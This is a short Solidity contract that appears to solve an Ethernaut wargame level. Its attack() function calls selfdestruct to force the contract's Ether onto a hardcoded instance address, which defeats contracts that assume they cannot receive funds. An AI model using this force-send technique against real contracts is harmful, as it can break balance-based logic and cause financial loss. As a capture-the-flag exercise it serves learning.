// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.0;

contract ToBeDeleted {

    function attack() payable public {
        address payable ethernaut = payable(0x3D4E4ac528Ca552602E3e5fe9CB0D2FAF5C1A116);
        selfdestruct(ethernaut);
    }
}